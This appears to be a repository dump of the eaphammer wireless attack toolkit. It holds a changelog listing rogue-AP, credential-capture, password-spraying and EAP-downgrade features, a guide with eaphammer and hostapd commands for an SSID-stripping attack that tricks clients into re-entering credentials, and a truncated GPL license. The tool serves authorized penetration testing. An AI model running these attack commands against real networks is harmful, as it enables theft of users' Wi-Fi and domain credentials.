{
  "metadata": {
    "timestamp": 1736709981324,
    "page": 548,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjU1MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "s0lst1c3/eaphammer",
      "stars": 2229,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 1.0205078125,
          "content": "# Byte-compiled / optimized / DLL files\n__pycache__/\n*.py[cod]\n*$py.class\n\n# C extensions\n*.so\n\n# Distribution / packaging\n.Python\nenv/\nbuild/\ndevelop-eggs/\ndist/\ndownloads/\neggs/\n.eggs/\nlib/\nlib64/\nparts/\nsdist/\nvar/\n*.egg-info/\n.installed.cfg\n*.egg\n\n# PyInstaller\n#  Usually these files are written by a python script from a template\n#  before PyInstaller builds the exe, so as to inject date/other infos into it.\n*.manifest\n*.spec\n\n# Installer logs\npip-log.txt\npip-delete-this-directory.txt\n\n# Unit test / coverage reports\nhtmlcov/\n.tox/\n.coverage\n.coverage.*\n.cache\nnosetests.xml\ncoverage.xml\n*,cover\n.hypothesis/\n\n# Translations\n*.mo\n*.pot\n\n# Django stuff:\n*.log\nlocal_settings.py\n\n# Flask stuff:\ninstance/\n.webassets-cache\n\n# Scrapy stuff:\n.scrapy\n\n# Sphinx documentation\ndocs/_build/\n\n# PyBuilder\ntarget/\n\n# IPython Notebook\n.ipynb_checkpoints\n\n# pyenv\n.python-version\n\n# celery beat schedule file\ncelerybeat-schedule\n\n# dotenv\n.env\n\n# virtualenv\nvenv/\nENV/\n\n# Spyder project settings\n.spyderproject\n\n# Rope project settings\n.ropeproject\n"
        },
        {
          "name": "Changelog",
          "type": "blob",
          "size": 9.48046875,
          "content": "0.0.1 - Gabriel Ryan <gryan@gdssecurity.com>\nInitial release.\n\n0.0.2 - Gabriel Ryan <gryan@gdssecurity.com>\nAdded Changelog.\nAdded tqdm to pip.req file.\nAdded python-pip to kali-dependencies.txt.\nAdded version string to ./eaphammer\nUpdated README to reflect changes.\n\n0.0.3 - Gabriel Ryan <gryan@gdssecurity.com>\nRemoved submodules, updated setup.py to reflect this.\n\n0.0.4 - Gabriel Ryan <gryan@gdssecurity.com>\nUpdated to use local copy of s0lst1c3/hostapd-eaphammer (hostapd-wpe without Cupid and Karma, uses latest openssl, uses hostapd-2.6)\nMoved version string from ./eaphammer to ./config.py.\nUpdated kali-dependencies.txt.\nUpdated setup.py.\nUpdated README to reflect changes.\n\n0.0.5 - Gabriel Ryan <gryan@gdssecurity.com>\nCerts are now signed using sha256 to ensure compatibility with current versions of OpenSSL.\nwlan_clean() in core/utils.py now properly raises network interface after stopping NetworkManager.\nUpdated version string in ./config.py.\n\n0.0.6 - Gabriel Ryan <gryan@gdssecurity.com>\nAdded WPASupplicant service to core utilities.\nEaphammer now stops wpa_supplicant service.\nUpdated version string in ./config.py.\n\n0.0.7 - Gabriel Ryan <gryan@gdssecurity.com>\nDaemons now log to [project root]/logs directory.\nDsniff's dnsspoof has been retired in favor dnsmasq.\nIntegrated redirect server added for hostile portal attacks (see core/servers/redirect_server.py).\nDnsmasq's config files are now managed by core.conf_manager.\nDnsmasq DHCP Only and Captive Portal configurations have been improved.\nResponder now works swimmingly.\nUpdated mainline logic for Captive Portal and Hostile Portal modes of operation (see eaphammer).\nSupport for dnsmasq's dhcp-script option added.\n\n0.0.8 - Gabriel Ryan <gryan@gdssecurity.com>\nHostile portal attacks have been improved.\nAdded autocrack and add functionality to support full EAP authentication.\nNo longer kills NetworkManager. Uses nmcli to set interfaces to \"unmanaged\" instead.\nAdded support for indirect wireless pivots (disable's Responder's SMB server so you can run MultiRelay, smbrelayx, etc).\nAdded payload_generator script to generate timed Powershell payloads for indirect wireless pivots (note: timed payload is for PoC purposes. If you're doing it for real, use a CobaltStrike beacon, Empire agent, or other respectable implant instead).\n\n0.0.9 - Gabriel Ryan <gryan@gdssecurity.com>\nAdded ehdb script for updating and managing eap_user file. \n\n0.1.0 - Gabriel Ryan <gryan@gdssecurity.com>\nAdded major expansion to documentation (README.md).\n\n0.1.1 - Gabriel Ryan <gryan@gdssecurity.com>\nAdded support for ESSID cloaking.\n\n0.1.2 - Gabriel Ryan <gryan@gdssecurity.com>\nCode cleanup.\n\n0.1.3 - Gabriel Ryan <gabriel@solstice.me>\nEAPHammer now displays captured MS-CHAPv2 challenge / response pairs in Hashcat format.\n\n0.1.4 - Gabriel Ryan <gabriel@solstice.me>\nFixed issue where setup script was unable to download rockyou wordlist due to: https://github.com/danielmiessler/SecLists/issues/166\n\n0.1.5 - Gabriel Ryan <gabriel@digitalsilence.com>\n- Fixed an issue where iptables rules were being saved unnecessarily on startup\n- Updated CLI\n- Enhancement: granular configuration and AP management options\n- New feature: manually specify a config file\n- New feature: save config files\n- Enhancement: multiple instances of eaphammer can now be run concurrently\n- New feature: Added 802.11a and 5GHz support\n- New featuer: Added out-of-the-box support for 802.11n\n- Temporary files are now written to tmp dir\n- Removed the web_delivery server since it's not currently being used.\n- Hostapd is no longer started as a daemon process and controlled by core.services. Instead, it is loaded as a library within eaphammer and run in a separate thread (rather than its own child process).  \n- Hostapd itself has been modified to ignore BSS conflicts when operating in 802.11n mode, which is necessary in order to successfully perform evil twin attacks in 802.11n mode (patch heavily derived from Mike Kazantsev's version (github.com/mk-fg)). Future versions will make this a feature that can be enabled or disabled based on user input.\n- Added apache2 as a dependency for Kali / Ubuntu / Debian.\n- Hostapd no longer user conf_manager. Instead, it is managed using the HostapdConfig class found in core/hostapd_config.py. The HostapdConfig class draws values from both the command line interface and settings/core/hostapd.ini. See README.md for details on how this works.\n- The command line interface has been updated to include 802.11n options, as well as both basic and advanced help output.\n- Command line interface has also been moved to a dedicated module found in core.cli.py.\n- Performed some code refactoring\n- Updated README.md\n\n0.4.0 - Gabriel Ryan <gabriel@digitalsilence.com>\n- New feature: password spraying attacks\n\n0.5.0 - Gabriel Ryan <gabriel@digitalsilence.com>\nEAPHammer now uses a local build of libssl that exists independently of the systemwide install. This local version is compiled with support for SSLv3, allowing EAPHammer to be used against legacy clients without compromising the integrity of the attacker's operating system.\n\n0.6.0 - Gabriel Ryan <gabriel@solstice.sh>\nEAPHammer ported to Python 3.\n\n0.7.0 - Gabriel Ryan <gabriel@solstice.sh>\nEAPHammer is now able to import external certificates, generate self-signed and trusted certificates, and load certificates at runtime. \n\n0.8.0 - Gabriel Ryan <gryan@specterops.io>\nPorted to hostapd 2.8 base.\n\n0.9.0 - Gabriel Ryan <gryan@specterops.io>\nSupport for GTC logging added. GTC Downgrade attack implemented by editing .eap_user file.\n\n0.9.1 - Gabriel Ryan <gryan@specterops.io>\nVersion string moved to a more sensible location.\n\n1.0.0 - Gabriel Ryan <gryan@specterops.io>\nSupport for EAP-MD5,EAP-PEAP/MD5, and EAP-TTLS/MD5 added.\n\n1.1.0 - Gabriel Ryan <gryan@specterops.io>\nAdded root check.\n\n1.1.1 - Gabriel Ryan <gryan@specterops.io>\nFixed index error in autocrack.\n\n1.2.0 - Gabriel Ryan <gryan@specterops.io>\nNo longer maintaining a dedicated version of Responder. Instead, relying on\nexternal dependency.\n\n1.3.0 - Gabriel Ryan <gryan@specterops.io>\nHostapd now compiled with support for OWE, WPA3, and 802.11ax. However, these protocols have not yet been integrated with the rest of the project.\n\n1.4.0 - Gabriel Ryan <gryan@specterops.io>\nAdded support for advanced karma attacks: known beacon (credit: Census Labs) and loud mode (credit: Sensepost). Added support for 802.11w (Protected Management Frames).\n\n1.5.0 - Gabriel Ryan <gryan@specterops.io>\nAdded support for rogue AP attacks against networks that use OWE and OWE Transition Mode.\n\n1.6.0 - Gabriel Ryan <gryan@specterops.io>\nAdded support for rogue AP attacks using WPA2-PSK (with handshake captures)(credit: Sensepost for original hostapd patch).\n\n1.7.0 - Gabriel Ryan <gryan@specterops.io>\nAdded \"Troll Defender\" option that triggers Windows Defender on nearby Windows\ndevices.\n\n1.8.0 - Gabriel Ryan <gryan@specterops.io>\nImproved EAP Downgrades. Users now have greater control over EAP Negotiation process. See [http://solstice.sh/wireless/eaphammer/2019/09/09/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/09/eap-downgrade-attacks/) for additional details.\n\n1.8.1 - Gabriel Ryan <gryan@specterops.io>\nBug fix, resolves #109.\n\n1.9.0 - Gabriel Ryan <gryan@specterops.io>\nDocumentation overhauled and moved to Wiki (thanks [FreqyXin](https://twitter.com/FreqyXin)!)\n\n1.9.1 - Gabriel Ryan <gryan@specterops.io>\nAdded logo to documentation.\n\n1.10.0 - Gabriel Ryan <gryan@specterops.io>\nAdded ssid and mac address level ACLs.\n\n1.11.0 - Gabriel Ryan <gryan@specterops.io>\nAdded beacon forger for executing known SSID bursts\n\n1.12.0 - Gabriel Ryan <gryan@specterops.io>\nAdded --known-ssids flag that can be used instead of --known-ssids-file flag.\n\n1.12.1 - Gabriel Ryan <gabriel@specterops.io>\nHostapd ctrl_interface name randomly generated to support multiple concurrent eaphammer instances, given absolute path\n\n1.12.2 - Gabriel Ryan <gabriel@specterops.io>\nFixed kali-setup file, updated kali-dependencies.txt file\n\n1.12.3 - Gabriel Ryan <gabriel@specterops.io>\nAdded official support for Parot OS (Security)\n\n1.13.0 - Gabriel Ryan <gabriel@solstice.sh>\nRevamped captive portal system. Added integrated website cloaner. Added raspbian support.\n\n1.13.0 - Gabriel Ryan <gabriel@solstice.sh>\nRevamped captive portal system. Added integrated website cloaner. Added raspbian support.\n\n1.13.1 - Gabriel Ryan <gabriel@solstice.sh>\nUpdated pip.req to reflect changes in 1.13.0 - (Credit goes to Jan Rude (github.com/whoot))\n\n1.13.2 - Gabriel Ryan <gabriel@solstice.sh>\nResolve issue #142 by updating /src/ap/wpa_auth.c - (Credit goes to github.com/rsrdesarrollo)\n\n1.13.3 - Gabriel Ryan <gabriel@solstice.sh>\nResolve issue #59 by fixing Python3 unicode bullshit. - (Credit goes to github.com/MarkusKrell)\n\n1.13.4 - Gabriel Ryan <gabriel@solstice.sh>\nResolve issue #59 by fixing Python3 unicode bullshit.  :D \n\n1.13.5 - Gabriel Ryan <gabriel@solstice.sh>\nFixed gevent / python 3.9 related fuckery.\n\n1.14.1 - Gabriel Ryan <gabriel@transmitengage.com>\nFixed hostapd-eaphammer_lib build issues.\nThe system-wide package manager (i.e. apt) is now the single source of truth for dependencies, including Python. Sounds stupid, but realistically it's probably the most stable option until we start managing the Python portions of this thing with something that isn't archaic (like Poetry) and published as a proper PyPi package.\nRemoved unused Python dependencies: jinja2, pyquery\nAdded support for Python 3.12 (Credit: github.com/D3vil0p3r)\nUpdated README to reflect use of apt during installation instructions (Credit: github.com/readloud)\nAdded wget to dependencies (Credit: github/pes-soft)\n"
        },
        {
          "name": "ESSIDStripping.md",
          "type": "blob",
          "size": 1.740234375,
          "content": "# ESSID Stripping\n\nAdd a non-printable UTF8 character to the AP ESSID to avoid new security settings on WiFi clients, such as Microsoft. This security configuration stores the information of the old connections and notifies if there are any changes, blocking the automatic connections and not allowing access to the network. In addition, the user's credentials could be obtained in case the computer uses client certificate or computer credentials in the domain, because for Windows is a new network.\n\nWith this attack, the AP name is the same for the client, but Windows detects the full name as a new one, as it sees the non-printable characters. Then, the client asks for the username, password, etc. when logging in. Like a new network.\n\n\nThe options are:\n- '\\r' for a new line.\n- '\\t' for a tab.\n- '\\n' for a enter, like '\\r'.\n- '\\x20' for a space, like adding a white space after the SSID option using quotes.\n\n\n## Attacking with original Eaphammer (only space)\n\n```bash\npython3 ./eaphammer -i wlan3 --auth wpa-eap --essid \"wifi-AP \" --creds --negotiate balanced\n```\n\n## Attacking with modified Eaphammer\n\nAn example using the  `--stripping '\\r'`  parameter is shown below. In this case we use '\\r' because is not showed by Android and it may go unnoticed as a new line in Windows, Linux and iOS.\n\n\n```bash\npython3 ./eaphammer -i wlan0 --auth wpa-eap --essid wifi-AP --creds --negotiate balanced --essid-stripping '\\r'\n```\n\n## Attacking manually using hostapd\n\nWe only have to use the UTF8 essid options, and use the P options in the essid2 in the hostapd.conf file:\n``` bash\nssid2=P\"wifi-AP\\x20\"\nutf8_ssid=1\n```\n\n# Refs\n\n- https://aireye.tech/2021/09/13/the-ssid-stripping-vulnerability-when-you-dont-see-what-you-get/\n\n- https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 34.3173828125,
          "content": "                    GNU GENERAL PUBLIC LICENSE\n                       Version 3, 29 June 2007\n\n Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>\n Everyone is permitted to copy and distribute verbatim copies\n of this license document, but changing it is not allowed.\n\n                            Preamble\n\n  The GNU General Public License is a free, copyleft license for\nsoftware and other kinds of works.\n\n  The licenses for most software and other practical works are designed\nto take away your freedom to share and change the works.  By contrast,\nthe GNU General Public License is intended to guarantee your freedom to\nshare and change all versions of a program--to make sure it remains free\nsoftware for all its users.  We, the Free Software Foundation, use the\nGNU General Public License for most of our software; it applies also to\nany other work released this way by its authors.  You can apply it to\nyour programs, too.\n\n  When we speak of free software, we are referring to freedom, not\nprice.  Our General Public Licenses are designed to make sure that you\nhave the freedom to distribute copies of free software (and charge for\nthem if you wish), that you receive source code or can get it if you\nwant it, that you can change the software or use pieces of it in new\nfree programs, and that you know you can do these things.\n\n  To protect your rights, we need to prevent others from denying you\nthese rights or asking you to surrender the rights.  Therefore, you have\ncertain responsibilities if you distribute copies of the software, or if\nyou modify it: responsibilities to respect the freedom of others.\n\n  For example, if you distribute copies of such a program, whether\ngratis or for a fee, you must pass on to the recipients the same\nfreedoms that you received.  You must make sure that they, too, receive\nor can get the source code.  And you must show them these terms so they\nknow their rights.\n\n  Developers that use the GNU GPL protect your rights with two steps:\n(1) assert copyright on the software, and (2) offer you this License\ngiving you legal permission to copy, distribute and/or modify it.\n\n  For the developers' and authors' protection, the GPL clearly explains\nthat there is no warranty for this free software.  For both users' and\nauthors' sake, the GPL requires that modified versions be marked as\nchanged, so that their problems will not be attributed erroneously to\nauthors of previous versions.\n\n  Some devices are designed to deny users access to install or run\nmodified versions of the software inside them, although the manufacturer\ncan do so.  This is fundamentally incompatible with the aim of\nprotecting users' freedom to change the software.  The systematic\npattern of such abuse occurs in the area of products for individuals to\nuse, which is precisely where it is most unacceptable.  Therefore, we\nhave designed this version of the GPL to prohibit the practice for those\nproducts.  If such problems arise substantially in other domains, we\nstand ready to extend this provision to those domains in future versions\nof the GPL, as needed to protect the freedom of users.\n\n  Finally, every program is threatened constantly by software patents.\nStates should not allow patents to restrict development and use of\nsoftware on general-purpose computers, but in those that do, we wish to\navoid the special danger that patents applied to a free program could\nmake it effectively proprietary.  To prevent this, the GPL assures that\npatents cannot be used to render the program non-free.\n\n  The precise terms and conditions for copying, distribution and\nmodification follow.\n\n                       TERMS AND CONDITIONS\n\n  0. Definitions.\n\n  \"This License\" refers to version 3 of the GNU General Public License.\n\n  \"Copyright\" also means copyright-like laws that apply to other kinds of\nworks, such as semiconductor masks.\n\n  \"The Program\" refers to any copyrightable work licensed under this\nLicense.  Each licensee is addressed as \"you\".  \"Licensees\" and\n\"recipients\" may be individuals or organizations.\n\n  To \"modify\" a work means to copy from or adapt all or part of the work\nin a fashion requiring copyright permission, other than the making of an\nexact copy.  The resulting work is called a \"modified version\" of the\nearlier work or a work \"based on\" the earlier work.\n\n  A \"covered work\" means either the unmodified Program or a work based\non the Program.\n\n  To \"propagate\" a work means to do anything with it that, without\npermission, would make you directly or secondarily liable for\ninfringement under applicable copyright law, except executing it on a\ncomputer or modifying a private copy.  Propagation includes copying,\ndistribution (with or without modification), making available to the\npublic, and in some countries other activities as well.\n\n  To \"convey\" a work means any kind of propagation that enables other\nparties to make or receive copies.  Mere interaction with a user through\na computer network, with no transfer of a copy, is not conveying.\n\n  An interactive user interface displays \"Appropriate Legal Notices\"\nto the extent that it includes a convenient and prominently visible\nfeature that (1) displays an appropriate copyright notice, and (2)\ntells the user that there is no warranty for the work (except to the\nextent that warranties are provided), that licensees may convey the\nwork under this License, and how to view a copy of this License.  If\nthe interface presents a list of user commands or options, such as a\nmenu, a prominent item in the list meets this criterion.\n\n  1. Source Code.\n\n  The \"source code\" for a work means the preferred form of the work\nfor making modifications to it.  \"Object code\" means any non-source\nform of a work.\n\n  A \"Standard Interface\" means an interface that either is an official\nstandard defined by a recognized standards body, or, in the case of\ninterfaces specified for a particular programming language, one that\nis widely used among developers working in that language.\n\n  The \"System Libraries\" of an executable work include anything, other\nthan the work as a whole, that (a) is included in the normal form of\npackaging a Major Component, but which is not part of that Major\nComponent, and (b) serves only to enable use of the work with that\nMajor Component, or to implement a Standard Interface for which an\nimplementation is available to the public in source code form.  A\n\"Major Component\", in this context, means a major essential component\n(kernel, window system, and so on) of the specific operating system\n(if any) on which the executable work runs, or a compiler used to\nproduce the work, or an object code interpreter used to run it.\n\n  The \"Corresponding Source\" for a work in object code form means all\nthe source code needed to generate, install, and (for an executable\nwork) run the object code and to modify the work, including scripts to\ncontrol those activities.  However, it does not include the work's\nSystem Libraries, or general-purpose tools or generally available free\nprograms which are used unmodified in performing those activities but\nwhich are not part of the work.  For example, Corresponding Source\nincludes interface definition files associated with source files for\nthe work, and the source code for shared libraries and dynamically\nlinked subprograms that the work is specifically designed to require,\nsuch as by intimate data communication or control flow between those\nsubprograms and other parts of the work.\n\n  The Corresponding Source need not include anything that users\ncan regenerate automatically from other parts of the Corresponding\nSource.\n\n  The Corresponding Source for a work in source code form is that\nsame work.\n\n  2. Basic Permissions.\n\n  All rights granted under this License are granted for the term of\ncopyright on the Program, and are irrevocable provided the stated\nconditions are met.  This License explicitly affirms your unlimited\npermission to run the unmodified Program.  The output from running a\ncovered work is covered by this License only if the output, given its\ncontent, constitutes a covered work.  This License acknowledges your\nrights of fair use or other equivalent, as provided by copyright law.\n\n  You may make, run and propagate covered works that you do not\nconvey, without conditions so long as your license otherwise remains\nin force.  You may convey covered works to others for the sole purpose\nof having them make modifications exclusively for you, or provide you\nwith facilities for running those works, provided that you comply with\nthe terms of this License in conveying all material for which you do\nnot control copyright.  Those thus making or running the covered works\nfor you must do so exclusively on your behalf, under your direction\nand control, on terms that prohibit them from making any copies of\nyour copyrighted material outside their relationship with you.\n\n  Conveying under any other circumstances is permitted solely under\nthe conditions stated below.  Sublicensing is not allowed; section 10\nmakes it unnecessary.\n\n  3. Protecting Users' Legal Rights From Anti-Circumvention Law.\n\n  No covered work shall be deemed part of an effective technological\nmeasure under any applicable law fulfilling obligations under article\n11 of the WIPO copyright treaty adopted on 20 December 1996, or\nsimilar laws prohibiting or restricting circumvention of such\nmeasures.\n\n  When you convey a covered work, you waive any legal power to forbid\ncircumvention of technological measures to the extent such circumvention\nis effected by exercising rights under this License with respect to\nthe covered work, and you disclaim any intention to limit operation or\nmodification of the work as a means of enforcing, against the work's\nusers, your or third parties' legal rights to forbid circumvention of\ntechnological measures.\n\n  4. Conveying Verbatim Copies.\n\n  You may convey verbatim copies of the Program's source code as you\nreceive it, in any medium, provided that you conspicuously and\nappropriately publish on each copy an appropriate copyright notice;\nkeep intact all notices stating that this License and any\nnon-permissive terms added in accord with section 7 apply to the code;\nkeep intact all notices of the absence of any warranty; and give all\nrecipients a copy of this License along with the Program.\n\n  You may charge any price or no price for each copy that you convey,\nand you may offer support or warranty protection for a fee.\n\n  5. Conveying Modified Source Versions.\n\n  You may convey a work based on the Program, or the modifications to\nproduce it from the Program, in the form of source code under the\nterms of section 4, provided that you also meet all of these conditions:\n\n    a) The work must carry prominent notices stating that you modified\n    it, and giving a relevant date.\n\n    b) The work must carry prominent notices stating that it is\n    released under this License and any conditions added under section\n    7.  This requirement modifies the requirement in section 4 to\n    \"keep intact all notices\".\n\n    c) You must license the entire work, as a whole, under this\n    License to anyone who comes into possession of a copy.  This\n    License will therefore apply, along with any applicable section 7\n    additional terms, to the whole of the work, and all its parts,\n    regardless of how they are packaged.  This License gives no\n    permission to license the work in any other way, but it does not\n    invalidate such permission if you have separately received it.\n\n    d) If the work has interactive user interfaces, each must display\n    Appropriate Legal Notices; however, if the Program has interactive\n    interfaces that do not display Appropriate Legal Notices, your\n    work need not make them do so.\n\n  A compilation of a covered work with other separate and independent\nworks, which are not by their nature extensions of the covered work,\nand which are not combined with it such as to form a larger program,\nin or on a volume of a storage or distribution medium, is called an\n\"aggregate\" if the compilation and its resulting copyright are not\nused to limit the access or legal rights of the compilation's users\nbeyond what the individual works permit.  Inclusion of a covered work\nin an aggregate does not cause this License to apply to the other\nparts of the aggregate.\n\n  6. Conveying Non-Source Forms.\n\n  You may convey a covered work in object code form under the terms\nof sections 4 and 5, provided that you also convey the\nmachine-readable Corresponding Source under the terms of this License,\nin one of these ways:\n\n    a) Convey the object code in, or embodied in, a physical product\n    (including a physical distribution medium), accompanied by the\n    Corresponding Source fixed on a durable physical medium\n    customarily used for software interchange.\n\n    b) Convey the object code in, or embodied in, a physical product\n    (including a physical distribution medium), accompanied by a\n    written offer, valid for at least three years and valid for as\n    long as you offer spare parts or customer support for that product\n    model, to give anyone who possesses the object code either (1) a\n    copy of the Corresponding Source for all the software in the\n    product that is covered by this License, on a durable physical\n    medium customarily used for software interchange, for a price no\n    more than your reasonable cost of physically performing this\n    conveying of source, or (2) access to copy the\n    Corresponding Source from a network server at no charge.\n\n    c) Convey individual copies of the object code with a copy of the\n    written offer to provide the Corresponding Source.  This\n    alternative is allowed only occasionally and noncommercially, and\n    only if you received the object code with such an offer, in accord\n    with subsection 6b.\n\n    d) Convey the object code by offering access from a designated\n    place (gratis or for a charge), and offer equivalent access to the\n    Corresponding Source in the same way through the same place at no\n    further charge.  You need not require recipients to copy the\n    Corresponding Source along with the object code.  If the place to\n    copy the object code is a network server, the Corresponding Source\n    may be on a different server (operated by you or a third party)\n    that supports equivalent copying facilities, provided you maintain\n    clear directions next to the object code saying where to find the\n    Corresponding Source.  Regardless of what server hosts the\n    Corresponding Source, you remain obligated to ensure that it is\n    available for as long as needed to satisfy these requirements.\n\n    e) Convey the object code using peer-to-peer transmission, provided\n    you inform other peers where the object code and Corresponding\n    Source of the work are being offered to the general public at no\n    charge under subsection 6d.\n\n  A separable portion of the object code, whose source code is excluded\nfrom the Corresponding Source as a System Library, need not be\nincluded in conveying the object code work.\n\n  A \"User Product\" is either (1) a \"consumer product\", which means any\ntangible personal property which is normally used for personal, family,\nor household purposes, or (2) anything designed or sold for incorporation\ninto a dwelling.  In determining whether a product is a consumer product,\ndoubtful cases shall be resolved in favor of coverage.  For a particular\nproduct received by a particular user, \"normally used\" refers to a\ntypical or common use of that class of product, regardless of the status\nof the particular user or of the way in which the particular user\nactually uses, or expects or is expected to use, the product.  A product\nis a consumer product regardless of whether the product has substantial\ncommercial, industrial or non-consumer uses, unless such uses represent\nthe only significant mode of use of the product.\n\n  \"Installation Information\" for a User Product means any methods,\nprocedures, authorization keys, or other information required to install\nand execute modified versions of a covered work in that User Product from\na modified version of its Corresponding Source.  The information must\nsuffice to ensure that the continued functioning of the modified object\ncode is in no case prevented or interfered with solely because\nmodification has been made.\n\n  If you convey an object code work under this section in, or with, or\nspecifically for use in, a User Product, and the conveying occurs as\npart of a transaction in which the right of possession and use of the\nUser Product is transferred to the recipient in perpetuity or for a\nfixed term (regardless of how the transaction is characterized), the\nCorresponding Source conveyed under this section must be accompanied\nby the Installation Information.  But this requirement does not apply\nif neither you nor any third party retains the ability to install\nmodified object code on the User Product (for example, the work has\nbeen installed in ROM).\n\n  The requirement to provide Installation Information does not include a\nrequirement to continue to provide support service, warranty, or updates\nfor a work that has been modified or installed by the recipient, or for\nthe User Product in which it has been modified or installed.  Access to a\nnetwork may be denied when the modification itself materially and\nadversely affects the operation of the network or violates the rules and\nprotocols for communication across the network.\n\n  Corresponding Source conveyed, and Installation Information provided,\nin accord with this section must be in a format that is publicly\ndocumented (and with an implementation available to the public in\nsource code form), and must require no special password or key for\nunpacking, reading or copying.\n\n  7. Additional Terms.\n\n  \"Additional permissions\" are terms that supplement the terms of this\nLicense by making exceptions from one or more of its conditions.\nAdditional permissions that are applicable to the entire Program shall\nbe treated as though they were included in this License, to the extent\nthat they are valid under applicable law.  If additional permissions\napply only to part of the Program, that part may be used separately\nunder those permissions, but the entire Program remains governed by\nthis License without regard to the additional permissions.\n\n  When you convey a copy of a covered work, you may at your option\nremove any additional permissions from that copy, or from any part of\nit.  (Additional permissions may be written to require their own\nremoval in certain cases when you modify the work.)  You may place\nadditional permissions on material, added by you to a covered work,\nfor which you have or can give appropriate copyright permission.\n\n  Notwithstanding any other provision of this License, for material you\nadd to a covered work, you may (if authorized by the copyright holders of\nthat material) supplement the terms of this License with terms:\n\n    a) Disclaiming warranty or limiting liability differently from the\n    terms of sections 15 and 16 of this License; or\n\n    b) Requiring preservation of specified reasonable legal notices or\n    author attributions in that material or in the Appropriate Legal\n    Notices displayed by works containing it; or\n\n    c) Prohibiting misrepresentation of the origin of that material, or\n    requiring that modified versions of such material be marked in\n    reasonable ways as different from the original version; or\n\n    d) Limiting the use for publicity purposes of names of licensors or\n    authors of the material; or\n\n    e) Declining to grant rights under trademark law for use of some\n    trade names, trademarks, or service marks; or\n\n    f) Requiring indemnification of licensors and authors of that\n    material by anyone who conveys the material (or modified versions of\n    it) with contractual assumptions of liability to the recipient, for\n    any liability that these contractual assumptions directly impose on\n    those licensors and authors.\n\n  All other non-permissive additional terms are considered \"further\nrestrictions\" within the meaning of section 10.  If the Program as you\nreceived it, or any part of it, contains a notice stating that it is\ngoverned by this License along with a term that is a further\nrestriction, you may remove that term.  If a license document contains\na further restriction but permits relicensing or conveying under this\nLicense, you may add to a covered work material governed by the terms\nof that license document, provided that the further restriction does\nnot survive such relicensing or conveying.\n\n  If you add terms to a covered work in accord with this section, you\nmust place, in the relevant source files, a statement of the\nadditional terms that apply to those files, or a notice indicating\nwhere to find the applicable terms.\n\n  Additional terms, permissive or non-permissive, may be stated in the\nform of a separately written license, or stated as exceptions;\nthe above requirements apply either way.\n\n  8. Termination.\n\n  You may not propagate or modify a covered work except as expressly\nprovided under this License.  Any attempt otherwise to propagate or\nmodify it is void, and will automatically terminate your rights under\nthis License (including any patent licenses granted under the third\nparagraph of section 11).\n\n  However, if you cease all violation of this License, then your\nlicense from a particular copyright holder is reinstated (a)\nprovisionally, unless and until the copyright holder explicitly and\nfinally terminates your license, and (b) permanently, if the copyright\nholder fails to notify you of the violation by some reasonable means\nprior to 60 days after the cessation.\n\n  Moreover, your license from a particular copyright holder is\nreinstated permanently if the copyright holder notifies you of the\nviolation by some reasonable means, this is the first time you have\nreceived notice of violation of this License (for any work) from that\ncopyright holder, and you cure the violation prior to 30 days after\nyour receipt of the notice.\n\n  Termination of your rights under this section does not terminate the\nlicenses of parties who have received copies or rights from you under\nthis License.  If your rights have been terminated and not permanently\nreinstated, you do not qualify to receive new licenses for the same\nmaterial under section 10.\n\n  9. Acceptance Not Required for Having Copies.\n\n  You are not required to accept this License in order to receive or\nrun a copy of the Program.  Ancillary propagation of a covered work\noccurring solely as a consequence of using peer-to-peer transmission\nto receive a copy likewise does not require acceptance.  However,\nnothing other than this License grants you permission to propagate or\nmodify any covered work.  These actions infringe copyright if you do\nnot accept this License.  Therefore, by modifying or propagating a\ncovered work, you indicate your acceptance of this License to do so.\n\n  10. Automatic Licensing of Downstream Recipients.\n\n  Each time you convey a covered work, the recipient automatically\nreceives a license from the original licensors, to run, modify and\npropagate that work, subject to this License.  You are not responsible\nfor enforcing compliance by third parties with this License.\n\n  An \"entity transaction\" is a transaction transferring control of an\norganization, or substantially all assets of one, or subdividing an\norganization, or merging organizations.  If propagation of a covered\nwork results from an entity transaction, each party to that\ntransaction who receives a copy of the work also receives whatever\nlicenses to the work the party's predecessor in interest had or could\ngive under the previous paragraph, plus a right to possession of the\nCorresponding Source of the work from the predecessor in interest, if\nthe predecessor has it or can get it with reasonable efforts.\n\n  You may not impose any further restrictions on the exercise of the\nrights granted or affirmed under this License.  For example, you may\nnot impose a license fee, royalty, or other charge for exercise of\nrights granted under this License, and you may not initiate litigation\n(including a cross-claim or counterclaim in a lawsuit) alleging that\nany patent claim is infringed by making, using, selling, offering for\nsale, or importing the Program or any portion of it.\n\n  11. Patents.\n\n  A \"contributor\" is a copyright holder who authorizes use under this\nLicense of the Program or a work on which the Program is based.  The\nwork thus licensed is called the contributor's \"contributor version\".\n\n  A contributor's \"essential patent claims\" are all patent claims\nowned or controlled by the contributor, whether already acquired or\nhereafter acquired, that would be infringed by some manner, permitted\nby this License, of making, using, or selling its contributor version,\nbut do not include claims that would be infringed only as a\nconsequence of further modification of the contributor version.  For\npurposes of this definition, \"control\" includes the right to grant\npatent sublicenses in a manner consistent with the requirements of\nthis License.\n\n  Each contributor grants you a non-exclusive, worldwide, royalty-free\npatent license under the contributor's essential patent claims, to\nmake, use, sell, offer for sale, import and otherwise run, modify and\npropagate the contents of its contributor version.\n\n  In the following three paragraphs, a \"patent license\" is any express\nagreement or commitment, however denominated, not to enforce a patent\n(such as an express permission to practice a patent or covenant not to\nsue for patent infringement).  To \"grant\" such a patent license to a\nparty means to make such an agreement or commitment not to enforce a\npatent against the party.\n\n  If you convey a covered work, knowingly relying on a patent license,\nand the Corresponding Source of the work is not available for anyone\nto copy, free of charge and under the terms of this License, through a\npublicly available network server or other readily accessible means,\nthen you must either (1) cause the Corresponding Source to be so\navailable, or (2) arrange to deprive yourself of the benefit of the\npatent license for this particular work, or (3) arrange, in a manner\nconsistent with the requirements of this License, to extend the patent\nlicense to downstream recipients.  \"Knowingly relying\" means you have\nactual knowledge that, but for the patent license, your conveying the\ncovered work in a country, or your recipient's use of the covered work\nin a country, would infringe one or more identifiable patents in that\ncountry that you have 